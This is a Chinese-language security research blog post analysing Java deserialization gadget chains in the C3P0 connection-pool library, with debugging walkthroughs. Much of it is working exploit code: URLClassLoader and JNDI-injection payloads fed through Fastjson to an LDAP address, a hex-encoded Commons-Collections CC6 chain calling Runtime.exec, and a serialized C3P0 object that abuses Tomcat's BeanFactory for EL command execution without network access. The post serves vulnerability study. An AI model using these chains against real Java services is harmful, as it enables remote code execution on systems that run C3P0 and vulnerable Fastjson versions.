# Java 反序列化之 C3P0 链学习

## 0x01 前言

再多打一点基础吧，后续打算先看一看 XStream，Weblogic，strusts2 这些个

## 0x02 C3P0 组件介绍

C3P0 是一个开源的 JDBC 连接池，它实现了数据源和 JNDI 绑定，支持 JDBC3 规范和 JDBC2 的标准扩展。目前使用它的开源项目有 Hibernate，Spring 等。

JDBC 是 Java DataBase Connectivity 的缩写，它是 Java 程序访问数据库的标准接口。

使用Java程序访问数据库时，Java 代码并不是直接通过 TCP 连接去访问数据库，而是通过 JDBC 接口来访问，而 JDBC 接口则通过 JDBC 驱动来实现真正对数据库的访问。

连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时Java在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术。

- 简单来说，C3P0 属于 jdbc 的一部分，和 Druid 差不多

## 0x03 C3P0 反序列化漏洞

### 环境

jdk8u65

pom.xml 如下

XML

```
<dependency>
    <groupId>com.mchange</groupId>
    <artifactId>c3p0</artifactId>
    <version>0.9.5.2</version>
</dependency>
```

### C3P0 反序列化三条 Gadgets

- 在去复现链子之前，既然这是一个数据源的组件，那么大概率会存在的漏洞是 URLClassLoader 的类的动态加载，还有 Jndi 注入。

好叭看了其他师傅的文章才知道，C3P0 常见的利用方式有如下三种

- URLClassLoader 远程类加载
- JNDI 注入
- 利用 HEX 序列化字节加载器进行反序列化攻击（第一次见，应该是我少见多怪了

我们还是以漏洞发现者的角度来复现一遍，尝试着能否少看一些其他师傅的文章，较为独立的找到链子。

### C3P0 之 URLClassLoader 的链子

#### C3P0 之 URLClassLoader 流程分析

我们先想一想，既然是 `URLClassLoader` 的链子，什么场景下会用到 `URLClassLoader` 的链子呢？

我的第一想法是，获取数据源很可能是通过 URLClassLoader 的，事实证明我的这种想法非常愚蠢，因为获取数据源并不是获取一个类。当然，最终也没找到，不过也是有点收获的。

后面又想到了，可能是 Ref 这种类型的类，于是我又回头找了一下，但是因为 IDEA 未能搜索依赖库内的内容，所以就寄了，直接看了其他师傅的文章。

找到的类是 `ReferenceableUtils`，当中的 `referenceToObject()` 方法调用了 `URLClassLoader` 加载类的方法

最后还有类的加载 ———— `instance()`，我们的链子尾部就找好了。

继续往上找，应该是去找谁调用了 `ReferenceableUtils.referenceToObject()`

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/getObject.png)

`ReferenceIndirector` 类的 `getObject()` 方法调用了 `ReferenceableUtils.referenceToObject()`，继续往上找

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/WrongGetObject.png)

`PoolBackedDataSourceBase#readObject()` 调用了 `ReferenceIndirector#getObject()`，同时这也正好是一个入口类。

总结链子流程图如图

#### C3P0 之 URLClassLoader EXP 编写

手写一遍 EXP 试试

先写 `ReferenceableUtils.referenceToObject()` 的 URLClassLoader 的 EXP。
EXP 如下

JAVA

```
public class RefToURLClassLoader {  
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, NamingException, InstantiationException {  
        Class clazz = Class.forName("com.mchange.v2.naming.ReferenceableUtils");  
        Reference reference = new Reference("Calc", "Calc","http://127.0.0.1:9999/");  
        Method method = clazz.getDeclaredMethod("referenceToObject", Reference.class, Name.class, Context.class, Hashtable.class);  
        method.setAccessible(true);  
        Object o = method.invoke(clazz, reference, null, null, null);  
        Object object = method.invoke(o, null, null, null, null);  
    }  
}
```

> 继续往前走，去看一下 `PoolBackedDataSourceBase#readObject()` 方法

这里的 `readObject()` 方法想要进到链子的下一步 `getObject()` 必须要满足一个条件，也就是传入的类必须要是 `IndirectlySerialized` 这个类。

在进行完这个判断之后

JAVA

```
this.connectionPoolDataSource = (ConnectionPoolDataSource) o;
```

执行 `.getObject()` 方法的类从原本的 `PoolBackedDataSourceBase` 变成了 `ConnectionPoolDataSource`，但是 `ConnectionPoolDataSource` 是一个接口，并且没有继承 `Serializable` 接口，所以是无法直接用于代码里面的。

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/ConnectionPoolDataSource.png)

- 这个地方有点卡住了，我们不妨去看一下 `PoolBackedDataSourceBase#writeObject()` 的时候，也就是序列化的时候做了什么

如图，直接包装了一层 `indirector.indirectForm()`

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/indirector.png)

我们跟进 `indirector.indirectForm()` 看一看，当然这个地方的 `indirector` 实际上就是 `com.mchange.v2.naming.ReferenceIndirector`，所以语句等价于

JAVA

```
ReferenceIndirector.indirectForm()
```

经过 `ReferenceIndirector.indirectForm()` 的 “淬炼”，我们直接看返回值是什么

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/ReferenceSerialized.png)

这里返回的是 `ReferenceSerialized` 的一个构造函数，`ReferenceSerialized` 实际上是一个内部类

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/ReferenceSerializedImplements.png)

跟进一下继承的接口

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/IndirectlySerialized.png)

发现它继承了 `Serializable` 接口，至此，包装的过程分析结束。现在我们拿到的 “ConnectionPoolDataSource” 外表上还是 “ConnectionPoolDataSource”，但是实际上已经变成了 “ReferenceSerialized” 这个类；事后师傅们可以自行打断点调试，这样体会的更深刻一些。

EXP 的编写也较为简单，值得一提的是，这里面有一个 `getReference()` 方法可以直接 new 一个 Reference 对象。

通过反射修改 connectionPoolDataSource 属性值为我们的恶意 ConnectionPoolDataSource 类

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/URLClassLoaderSuccess.png)

### C3P0 之 JNDI 注入

#### 误打误撞看到的一处伪 JNDI 注入，失败告终

虽然是误打误撞看到的，也是失败的，但是依然有价值。后面看了[枫师傅](https://goodapple.top/)的博客，发现这里居然还是可以利用的，简直太强了。

- 其实是在寻找上一条 Gadget 的时候发现的

位置在这个地方 `com.mchange.v2.naming.ReferenceIndirector`

它的 `getObject()` 方法里面有 `initialContext.lookup()`

所以我尝试了一下发现几个问题，虽然是坑吧，但是这个坑我更愿意称之为尝试。

首先这里，我们如果要触发 JNDI 注入，那么肯定需要控制 `contextName` 这个属性值，结果好巧不巧，这个属性值是一个类

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/contextName.png)![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/ReferenceSerializedContextName.png)

既然是一个类，就不能直接赋给字符串对象，然后我尝试了它接口的实现类，发现不行，只能是自己这个接口；这利用面感觉太小太小了，很难挖；所以我这里就放弃了。

- 也挂一手失败的 EXP 吧

JAVA

```
public class Test {  
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, NoSuchFieldException, IllegalAccessException, InstantiationException, InvocationTargetException, InvalidNameException {  
        Class clazz = Class.forName("com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized");  
        Method method = clazz.getDeclaredMethod("getObject");  
        Field ContextField = clazz.getDeclaredField("contextName");  
        ContextField.setAccessible(true);  
        DnsName dnsName = new DnsName();  
        ContextField.set(dnsName,dnsName);  
        Object o = method.invoke(clazz);  
        method.invoke(o);  
    }  
}
```

挺有意思的一次尝试，哈哈哈哈。

#### C3P0 之 JNDI 注入流程分析

这条链子是基于 Fastjson 链子的，也就是说，是 Fastjson 的某一条链

我们还是以漏洞发现者的思维去寻找，在库中全局搜索 `Jndi`，看看是否有收获

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/FindJndi.png)

点开第一个试一下，接着在这个类当中找 `jndi` 关键词，看到了这个方法：`dereference()`

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/dereference.png)

- 在第 112 行与第 114 行，有非常惹人注目的 `ctx.lookup()`

这里被 `lookup()` 的变量是 `jndiName`，跟进去看一下 `jndiName` 是什么

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/jndiName.png)

`jndiName` 是由 `this.getJndiName()` 搞来的，跟进看一看 `getJndiName()` 方法

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/getJndiName.png)

这个方法做了一件什么事呢？它判断了拿进来的 `jndiName` 是不是 `Name` 的类型，如果是就返回 `((Name) jndiName).clone()`，若不是就返回 `String`；回想起我前文挖洞失败的那个经历，不就是因为传参是一个对象所以无法利用吗！

我这里的运气非常好，第一次找就找到了这个漏洞类

回到前面，我们看一下 `dereference()` 方法，是否允许我们传入一个 `String` 类型的参数

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/dereferenceString.png)

至此，链子的尾部已经是没问题的了，向上找可用的地方

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/inner.png)

同一个类下的 `inner()` 方法调用了它，继续往上找

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/setLoginTimeout.png)

这里有非常多的 `getter/setter` 方法，已经是满足作为 fastjson 调用链的条件了，但是对于选择上来说，我们选最简单的 `setLoginTimeout()` 方法，因为它的传参只需要我们传入一个整数即可。

我觉得这里已经可以写 EXP 了，但是看到有其他师傅的文章分析的意思是：还要继续向上找，可能是因为这个 `JndiRefForwardingDataSource` 类是 default 的类，觉得利用面还是不够大吧，我个人觉得从攻击的角度上来说是都可以的，后续在写 EXP 的环节也会把这个写进去。

- 如果要继续网上找的话，还有一个是可以利用的类

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/JndiRefConnectionPoolDataSource.png)

再向上找可能还是可以，还能利用，但已经完全没必要了。因为黑命单加的都是大类，如果简短的链子被 ban 了，再深的链子也是被 ban 的。

#### C3P0 之 JNDI EXP 构造

先导入 fastjson 的包，就先导 1.2.24 的吧，因为 1.2.25 版本的 fastjson 当中就已经把 `com.mchange` 包加入了黑名单里面。

XML

```
<dependency>  
    <groupId>com.alibaba</groupId>  
    <artifactId>fastjson</artifactId>  
    <version>1.2.24</version>  
</dependency>
```

`JndiRefForwardingDataSource` 的 EXP 如下

JAVA

```
package JNDIVul;  
  
import com.alibaba.fastjson.JSON;  
  
// JndiRefForwardingDataSource 类的直接 EXP 调用  
public class JndiForwardingDataSourceEXP {  
    public static void main(String[] args) {  
        String payload = "{\"@type\":\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\"," +  
                "\"jndiName\":\"ldap://127.0.0.1:1230/remoteObject\",\"LoginTimeout\":\"1\"}";  
        JSON.parse(payload);  
    }  
}
```

因为是 default 作用域的类，所以不可以直接 new，这里我们直接用 fastjson 的方式去调

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/JndiRefForwardingDataSourceSuccess.png)

`JndiRefConnectionPoolDataSource` 的 EXP 也大同小异，因为这是个 public 为作用域的类，我们可以先通过这种方式测试一下链子的可用性。

JAVA

```
public class JndiRefConnectionPoolDataSourceTest {  
    public static void main(String[] args) throws PropertyVetoException, SQLException {  
        JndiRefConnectionPoolDataSource jndiRefConnectionPoolDataSource = new JndiRefConnectionPoolDataSource();  
        jndiRefConnectionPoolDataSource.setJndiName("ldap://127.0.0.1:1230/remoteObject");  
        jndiRefConnectionPoolDataSource.setLoginTimeout(1);  
    }  
}
```

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/JndiRefConnectionPoolDataSourceTestSuccess.png)

- 用 fastjson 打也比较简单

JAVA

```
public class JndiRefConnectionPoolDataSourceEXP {  
    public static void main(String[] args) {  
        String payload = "{\"@type\":\"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\"," +  
                "\"jndiName\":\"ldap://127.0.0.1:1230/remoteObject\",\"LoginTimeout\":\"1\"}";  
        JSON.parse(payload);  
    }  
}
```

成功

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/JndiRefConnectionPoolDataSourceSuccess.png)

### C3P0 之 hexbase 攻击利用

- 这个点因为之前从来没有接触到过，所以跟着其他师傅的文章学习一下，同时这一种利用方式也是二次反序列化的利用之一。

#### C3P0 之 hexbase 流程分析

这条链子能成立的根本原因是，有一个
`WrapperConnectionPoolDataSource` 类，它能够反序列化一串十六进制字符串

链子首部是在 `WrapperConnectionPoolDataSource` 类的构造函数中，如图

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/WrapperConnectionPoolDataSource.png)

在给 `userOverrides` 赋值的时候，用的是 `C3P0ImplUtils.parseUserOverridesAsString()` 这么一个操作，这个方法的作用就是反序列化 `userOverride` 把它这个 String 类型的东西转为对象。跟进

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/parseUserOverridesAsString.png)

它这里把 hex 字符串读了进来，把转码后的结果保存到了 `serBytes` 这个字节流的数组中，这个字节流是拿去进行 `SerializableUtils.fromByteArray()` 的操作，值得注意的是，在解析过程中调用了 `substring()` 方法将字符串头部的 `HASM_HEADER` 截去了，因此我们在构造时需要在十六进制字符串头部加上 `HASM_HEADER`，并且会截去字符串最后一位，所以需要在结尾加上一个`;`

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/fromByteArray.png)

```
SerializableUtils#fromByteArray()` 调用了 `SerializableUtils#deserializeFromByteArray`，跟进，看到了反序列化的操作 ———— `readObject()
```

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/deserializeFromByteArray.png)

#### C3P0 之 hexbase EXP 编写

- 因为我们在链子的第一步的时候，看到传入的参数是 `this.getUserOverridesAsString()`，所以用 Fastjson 的链子打会很简单。

这里我们需要写一个构造 hex 的 EXP，调用之前学 CC 链就可以

EXP 如下

JAVA

```
package hexBase;  
  
import com.alibaba.fastjson.JSON;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.beans.PropertyVetoException;  
import java.io.ByteArrayOutputStream;  
import java.io.IOException;  
import java.io.ObjectOutputStream;  
import java.io.StringWriter;  
import java.lang.reflect.Field;  
import java.util.HashMap;  
import java.util.Map;  
  
public class HexBaseFastjsonEXP {  
  
    //CC6的利用链  
 public static Map CC6() throws NoSuchFieldException, IllegalAccessException {  
        //使用InvokeTransformer包装一下  
 Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        HashMap<Object, Object> hashMap = new HashMap<>();  
        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer("five")); // 防止在反序列化前弹计算器  
 TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");  
        HashMap<Object, Object> expMap = new HashMap<>();  
        expMap.put(tiedMapEntry, "value");  
        lazyMap.remove("key");  
  
        // 在 put 之后通过反射修改值  
 Class<LazyMap> lazyMapClass = LazyMap.class;  
        Field factoryField = lazyMapClass.getDeclaredField("factory");  
        factoryField.setAccessible(true);  
        factoryField.set(lazyMap, chainedTransformer);  
  
        return expMap;  
    }  
  
  
    static void addHexAscii(byte b, StringWriter sw)  
    {  
        int ub = b & 0xff;  
        int h1 = ub / 16;  
        int h2 = ub % 16;  
        sw.write(toHexDigit(h1));  
        sw.write(toHexDigit(h2));  
    }  
  
    private static char toHexDigit(int h)  
    {  
        char out;  
        if (h <= 9) out = (char) (h + 0x30);  
        else out = (char) (h + 0x37);  
        //System.err.println(h + ": " + out);  
 return out;  
    }  
  
    //将类序列化为字节数组  
 public static byte[] tobyteArray(Object o) throws IOException {  
        ByteArrayOutputStream bao = new ByteArrayOutputStream();  
        ObjectOutputStream oos = new ObjectOutputStream(bao);  
        oos.writeObject(o);  
        return bao.toByteArray();  
    }  
  
    //字节数组转十六进制  
 public static String toHexAscii(byte[] bytes)  
    {  
        int len = bytes.length;  
        StringWriter sw = new StringWriter(len * 2);  
        for (int i = 0; i < len; ++i)  
            addHexAscii(bytes[i], sw);  
        return sw.toString();  
    }  
  
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException {  
        String hex = toHexAscii(tobyteArray(CC6()));  
        System.out.println(hex);  
  
        //Fastjson<1.2.47  
 String payload = "{" +  
                "\"1\":{" +  
                "\"@type\":\"java.lang.Class\"," +  
                "\"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"" +  
                "}," +  
                "\"2\":{" +  
                "\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"," +  
                "\"userOverridesAsString\":\"HexAsciiSerializedMap:"+ hex + ";\"," +  
                "}" +  
                "}";  
        JSON.parse(payload);  
  
  
    }  
}
```

在低版本 Fastjson 的情况下，实际上也可以使用下面的 Payload

```
String payload = "{" +
        "\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"," +
        "\"userOverridesAsString\":\"HexAsciiSerializedMap:"+ hex + ";\"," +
        "}";
```

#### C3P0 之 hexbase 调试分析

- 断点位置如图

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/debugPoint.png)

因为我们第一次 Fastjson 拿进去打的是空，是用来加载的，第二次的 payload 是执行，所以可以直接跳过第一次的加载。

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/FirstNull.png)

当第二次 Fastjson 进来的时候，就有了

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/SuccessLoadHex.png)

在过了 `substring` 这一步之后，我们看到前面的：`HexAsciiSerializedMap:` 都无了，现在加载进来的才是真正的 hex 内容

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/replaceHex.png)

接着，把 hex 的内容转化为了 bytes 字节码

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/replaceHex.png)

下一步，进行反序列化

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/bytesDeserializeFromByteArray.png)

跟进

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/readObjectCalc.png)

成功弹出计算器

#### C3P0 之 hexbase 另类 EXP 调试分析

- 在上文 EXP 的编写中，我提到了 “在低版本 Fastjson 的情况下，实际上也可以使用下面的 Payload”

这到底是怎么一回事儿呢

实际上 Fastjson 初始化 `WrapperConnectionPoolDataSource` 类时，`userOverridesAsString` 属性是空的，要想进行反序列化操作，必须先给其赋值。理论上来说，要想解析 `userOverridesAsString` 属性，至少需要调用两次构造函数。

我们来调试看一下

- 断点依旧是同一个位置，开始调试

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/Strange.png)

惊奇的发现，`userOverrideAsString` 一开始为 null，但是经过一轮之后，变成了 hex；这到底是为什么呢？我们可以去到 `WrapperConnectionPoolDataSourceBase#setUserOverridesAsString` 里面去看一看

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/setUserOverridesAsString.png)

不妨在这个地方下个断点，然后调试一下。

师傅们调试的时候会发现，这个

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/equalBoth.png)

`setUserOverridesAsString()` 的运行逻辑大致是这样的，首先把之前为 null 的 `userOverridesAsString` 赋值给 `oldVal`，接着判断这两个是否相等，或者是否都为 null，如果不满足这个条件，就把新的值赋给 `userOverridesAsString`，如图

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/GiveVal.png)

后续的过程和前面一样，就不再分析了。

## 0x04 C3P0 链子的不出网利用

这一种攻击方式是向[枫师傅](https://goodapple.top/archives/1749)学到的

不论是 URLClassLoader 加载远程类，还是 JNDI 注入，都需要目标机器能够出网。

而加载 Hex 字符串的方式虽然不用出网，但却有 Fastjson 等的相关依赖。那么如果目标机器不出网，又没有 Fastjson 依赖的话，C3P0 链又该如何利用呢？

- 关于 Java 的链子，如何不出网利用一直是一个很有趣的话题，也是很有意思的攻击面。

在 Jndi 高版本利用中，我们可以加载本地的 Factory 类进行攻击，而利用条件之一就是该工厂类至少存在一个 `getObjectInstance()` 方法。比如通过加载 Tomcat8 中的 `org.apache.naming.factory.BeanFactory` 进行 EL 表达式注入；关于 EL 表达式注入可以看这篇 [Java 之 EL 表达式注入](https://drun1baby.github.io/2022/09/23/Java-之-EL-表达式注入/)

先导入依赖

XML

```
<dependency>  
    <groupId>org.apache.tomcat</groupId>  
    <artifactId>tomcat-catalina</artifactId>  
    <version>8.5.0</version>  
</dependency>  
<dependency>  
    <groupId>org.apache.tomcat.embed</groupId>  
    <artifactId>tomcat-embed-el</artifactId>  
    <version>8.5.15</version>  
</dependency>
```

### C3P0 链子的不出网利用分析与 EXP

已经确定是想通过 EL 表达式注入的方式攻击了，我们需要先选择攻击的链子。

Jndi 的链子比较难，限制非常多，而且是不出网的利用，所以 pass 了；

URLClassLoader 的链子是可行的，只需要我们把之前 URLClassLoader 的 EXP 进行一些修改即可。

HexBase 的链子也是不可行的，因为它是基于 Fastjson 的一条链子。

EXP 如下

JAVA

```
package NoNetUsing;  
  
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;  
import org.apache.naming.ResourceRef;  
  
import javax.naming.NamingException;  
import javax.naming.Reference;  
import javax.naming.Referenceable;  
import javax.naming.StringRefAddr;  
import javax.sql.ConnectionPoolDataSource;  
import javax.sql.PooledConnection;  
import java.io.*;  
import java.lang.reflect.Field;  
import java.sql.SQLException;  
import java.sql.SQLFeatureNotSupportedException;  
import java.util.logging.Logger;  
  
public class NoAccessEXP {  
  
    public static class Loader_Ref implements ConnectionPoolDataSource, Referenceable {  
  
        @Override  
 public Reference getReference() throws NamingException {  
            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);  
            resourceRef.add(new StringRefAddr("forceString", "faster=eval"));  
            resourceRef.add(new StringRefAddr("faster", "Runtime.getRuntime().exec(\"calc\")"));  
            return resourceRef;  
        }  
  
        @Override  
 public PooledConnection getPooledConnection() throws SQLException {  
            return null;  
        }  
  
        @Override  
 public PooledConnection getPooledConnection(String user, String password) throws SQLException {  
            return null;  
        }  
  
        @Override  
 public PrintWriter getLogWriter() throws SQLException {  
            return null;  
        }  
  
        @Override  
 public void setLogWriter(PrintWriter out) throws SQLException {  
  
        }  
  
        @Override  
 public void setLoginTimeout(int seconds) throws SQLException {  
  
        }  
  
        @Override  
 public int getLoginTimeout() throws SQLException {  
            return 0;  
        }  
  
        @Override  
 public Logger getParentLogger() throws SQLFeatureNotSupportedException {  
            return null;  
        }  
    }  
  
    //序列化  
 public static void serialize(ConnectionPoolDataSource c) throws NoSuchFieldException, IllegalAccessException, IOException {  
        //反射修改connectionPoolDataSource属性值  
 PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);  
        Class cls = poolBackedDataSourceBase.getClass();  
        Field field = cls.getDeclaredField("connectionPoolDataSource");  
        field.setAccessible(true);  
        field.set(poolBackedDataSourceBase,c);  
  
        //序列化流写入文件  
 FileOutputStream fos = new FileOutputStream(new File("ser.bin"));  
        ObjectOutputStream oos = new ObjectOutputStream(fos);  
        oos.writeObject(poolBackedDataSourceBase);  
  
    }  
  
    //反序列化  
 public static void unserialize() throws IOException, ClassNotFoundException {  
        FileInputStream fis = new FileInputStream(new File("ser.bin"));  
        ObjectInputStream objectInputStream = new ObjectInputStream(fis);  
        objectInputStream.readObject();  
    }  
  
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {  
        Loader_Ref loader_ref = new Loader_Ref();  
        serialize(loader_ref);  
        unserialize();  
    }  
}
```

把原来 URLClassLoader 的地方修改成 EL 表达式的命令执行即可。

### C3P0 链子的不出网利用调试

- 简单调试理解一下。

先把断点下在 `BeanFactory` 的 `getObjectInstance()` 方法下，因为这里是一定被调用到的。

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/BeanFactory.png)

此处，我们可以看到之前的调用链，如图

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/FormerChains.png)

我们去到 `readObject()` 方法的地方加一个断点，再重新跑一遍，简单调试一下，我们就可以看到这是一个 URLClassLoader 的链子。

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/SeeURLClassLoader.png)

- 此处进行了命令执行的操作

![img](https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/invoke.png)

## 0x05 小结

C3P0 这条链子分析起来还是不难，建议师傅们可以动手去尝试一个个类看一下，看哪里可能会存在有漏洞。

同时 C3P0 链的价值也是非常高的，C3P0 的包在实战环境中除CommonsCollections、CommonsBeanutiles 以外遇到最多的 JAR 包，其中一部分 C3P0 是被 `org.quartz-scheduler:quartz` 所依赖进来的。

关于前文提到的 **”误打误撞看到的一处伪 JNDI 注入，失败告终”**，后续文章会仔细讲这一片段。对应的有一道例题 [Dest0g3 520迎新赛——ljctr](https://buuoj.cn/match/matches/109/challenges#ljctr)

## 0x06 参考资料

https://www.cnblogs.com/nice0e3/p/15058285.html
https://tttang.com/archive/1411/#toc_urlclassloader
https://goodapple.top/archives/1749